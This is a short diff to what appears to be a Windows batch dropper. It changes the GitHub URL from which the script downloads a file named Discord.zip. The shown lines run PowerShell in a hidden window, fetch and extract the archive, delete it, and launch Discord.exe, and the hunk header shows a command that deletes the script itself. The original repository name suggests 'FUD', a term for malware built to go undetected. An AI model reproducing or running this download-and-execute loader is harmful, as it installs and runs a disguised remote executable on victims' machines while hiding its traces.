@@ -44,7 +44,7 @@ del "%~f0" & exit
 
 powershell -window hidden -command ""
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/Discord.zip' -OutFile Discord.zip"
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/1/raw/refs/heads/main/Discord.zip' -OutFile Discord.zip"
 tar -xf Discord.zip
 del Discord.zip
 start Discord.exe
